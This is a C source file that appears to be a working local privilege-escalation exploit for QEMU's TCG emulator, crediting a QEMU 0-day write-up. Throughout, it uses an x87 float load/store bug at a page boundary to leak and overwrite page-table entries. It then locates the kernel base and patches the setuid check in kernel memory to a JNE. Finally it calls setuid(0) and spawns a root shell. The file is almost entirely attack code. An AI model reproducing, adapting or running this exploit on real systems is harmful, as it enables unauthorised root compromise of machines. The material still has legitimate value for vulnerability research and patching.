#define _GNU_SOURCE
#include <errno.h>
#include <linux/perf_event.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define WAIT(void)                                                             \
    {                                                                          \
        getc(stdin);                                                           \
        fflush(stdin);                                                         \
    }
#define errExit(fmt, ...)                                                      \
    do {                                                                       \
        int saved_errno = errno;                                               \
        fprintf(stderr, fmt ": %s\n", ##__VA_ARGS__, strerror(saved_errno));   \
        exit(EXIT_FAILURE);                                                    \
    } while (0)

#define _pte_index_to_virt(i) (i << 12)
// pmd = Page Middle Directory
// (often called PDE (page directory entry))
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index)               \
    ((void *)(_pgd_index_to_virt((uint64_t)(pud_index)) +                      \
              _pud_index_to_virt((uint64_t)(pmd_index)) +                      \
              _pmd_index_to_virt((uint64_t)(pte_index)) +                      \
              _pte_index_to_virt((uint64_t)(page_index))))

#define PAGE_SIZE 0x1000
#define UNMOVABLE_BASE 0xdeadbeef000ul

// bytes in memory at kernel base
#define KERNEL_NEEDLE 0x4101e9e8ae0f9066ul
#define KERNEL_ALIGNMENT 0x200000ul
#define KERNEL_START 0x1000000ul
#define KERNEL_SETUID_CHECK 0x2b1e20ul

#define RW_FLAGS 0x67
#define JNE_OPCODE 0x75

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

static int perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu,
                           int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

// due to an integer underflow, combination of these instructions allow for a 6
// byte read / write to an adjacent page if addr is chosen at page boundary
//
// Store ST(0) to an 80-bit float at the given address
void fstp_to_addr(void *addr) {
    __asm__ volatile("fstp tbyte ptr [%0]" : : "r"(addr) : "memory");
}
// Load an 80-bit float from the given address into ST(0)
void fld_from_addr(void *addr) {
    __asm__ volatile("fld tbyte ptr [%0]" : : "r"(addr) : "memory");
}

void *map_unmovable(void *addr) {
    long page = sysconf(_SC_PAGESIZE);
    size_t data_pages = 1;
    size_t len = (data_pages)*page; /* metadata page + data ring */

    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.sample_period = 100000;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    attr.exclude_hv = 1;

    int fd = perf_event_open(&attr, 0, -1, -1, PERF_FLAG_FD_CLOEXEC);
    if (fd < 0) {
        errExit("perf_event_open");
    }

    void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) {
        errExit("mmap");
    }

    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    *(char *)p = 'A';

    return p;
}

void unmap_unmovable(void *addr) {
    int ret = munmap(addr, PAGE_SIZE);
    if (ret < 0) {
        errExit("munmap unmovable failed");
    }
}

typedef struct __attribute__((__packed__)) {
    uint16_t low;
    uint64_t payload : 48;
    uint16_t high;
} float_struct_t;

void spray_pt(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        uint64_t *p =
            mmap(PTI_TO_VIRT(1, 0, i, 0), PAGE_SIZE, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

        if (p == MAP_FAILED) {
            errExit("mmap failed");
        }

        *p = i;
    }
}

void *find_corrupted(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        uint64_t *p = (uint64_t *)PTI_TO_VIRT(1, 0, i, 0);

        if (*p != i) {
            info("expected: %u, got: %u \n", i, *p);
            return p;
        }
    }

    return NULL;
}

void unspray_pt(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        int ret = munmap(PTI_TO_VIRT(1, 0, i, 0), PAGE_SIZE);
        if (ret < 0) {
            errExit("munmap");
        }
    }
}

// Evict TLB entries by creating and touching many temporary mappings.
// Touching each page forces a page-table walk and fills the TLB with new
// translations, pushing out older entries by capacity pressure.
void evict_tlb() {
    for (unsigned i = 0; i < 0x100; ++i) {
        char *m = (char *)mmap(PTI_TO_VIRT(2, 0, i, 0), PAGE_SIZE,
                               PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

        if (m == MAP_FAILED) {
            errExit("evict mmap failed \n");
        }

        *m = 'A';
    }
    for (unsigned i = 0; i < 0x100; ++i) {
        int ret = munmap(PTI_TO_VIRT(2, 0, i, 0), PAGE_SIZE);
        if (ret < 0) {
            errExit("munmap failed\n");
        }
    }
}

// TCG reliant qemu exploit based on: https://kqx.io/post/qemu-0day/
int main(void) {
    float_struct_t *fs = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                              MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    if (fs == MAP_FAILED) {
        errExit("mmap float_struct");
    }

    void *unmovable;
    for (unsigned i = 0; i < 0x100; ++i) {
        spray_pt(0x20, 0x20);

        unmovable = map_unmovable((void *)PTI_TO_VIRT(1, 0, 0x20, 0));
        info("unmovable: %p \n", unmovable);

        spray_pt(0x40, 0x20);

        fld_from_addr(unmovable + 0xffe);
        fstp_to_addr(fs);

        printf("leaked: %lx\n", fs->payload);

        if ((fs->payload & 0xff) == 0x67) {
            info("pt after unmovable page, iteration: %u \n", i);
            break;
        }

        fs->payload = 0;

        unspray_pt(0x20, 0x40);
        unmap_unmovable(unmovable);
    }

    uint64_t phys_leak = fs->payload & ~0xfff;

    // corrupt PTE by increasing physical address stored in PTE
    fs->payload += PAGE_SIZE;

    // corrupt the page table
    fld_from_addr(fs);
    fstp_to_addr(unmovable + 0xffe);

    evict_tlb();

    void *corrupted = find_corrupted(0x20, 0x40);
    if (corrupted == NULL) {
        errExit("failed to find corrupted page \n");
    }

    uint64_t base;
    for (base = KERNEL_START; base < KERNEL_START + KERNEL_ALIGNMENT * 0x1000;
         base += KERNEL_ALIGNMENT) {
        // set pte
        printf("testing kernel base: %p\n", base);
        fs->payload = base | RW_FLAGS;

        fld_from_addr(fs);
        fstp_to_addr(unmovable + 0xffe);

        evict_tlb();

        if (*(unsigned long *)corrupted == KERNEL_NEEDLE) {
            printf("found kernel base @ %p\n", base);
            break;
        }
    }

    // set pte
    fs->payload = base + (KERNEL_SETUID_CHECK & ~(PAGE_SIZE - 1)) | RW_FLAGS;
    fld_from_addr(fs);
    fstp_to_addr(unmovable + 0xffe);

    // quick TLB flush (works only if KPTI is on)
    evict_tlb();

    // patch JE to JNE inside setuid syscall implementation (sys_setuid)
    ((uint8_t *)corrupted)[KERNEL_SETUID_CHECK & (PAGE_SIZE - 1)] = JNE_OPCODE;

    setuid(0);
    printf("uid: %d\n", getuid());

    system("/bin/sh");
}
